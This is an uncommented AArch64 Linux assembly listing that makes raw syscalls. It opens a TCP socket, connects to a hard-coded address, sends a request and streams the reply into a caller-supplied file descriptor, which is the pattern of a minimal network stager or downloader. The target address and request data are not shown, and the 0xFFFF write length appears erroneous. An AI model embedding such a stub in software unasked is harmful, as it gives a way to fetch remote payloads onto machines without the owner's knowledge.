sxtw  x4, w0
movz  x8, #0xc6
movz  x0, #0x2
movz  x1, #0x1
movz  x2, #0x6
svc   #0
tbnz  w0, #0x1f, #0xb4
sxtw  x3, w0
movz  x8, #0xcb
mov   x0, x3
adrp  x1, #0
movz  x2, #0x10
add   x1, x1, #0xbc
svc   #0
cmn   w0, #1
b.eq  #0xa8
adrp  x1, #0
sub   sp, sp, #0x100
movz  x8, #0x40
mov   x0, x3
add   x1, x1, #0xcc
movz  x2, #0xFFFF
svc   #0
mov   x5, sp
mov   x0, x3
mov   x1, x5
movz  x8, #0x3f
movz  x2, #0x100
svc   #0
mov   x2, x0
cmp   x0, #0
b.le  #0x90
mov   x0, x4
movz  x8, #0x40
svc   #0
b     #0x60
movz  x8, #0x39
mov   x0, x3
svc   #0
movz  w0, #0
add   sp, sp, #0x100
ret
movz  x8, #0x39
mov   x0, x3
svc   #0
movz  w0, #0
ret

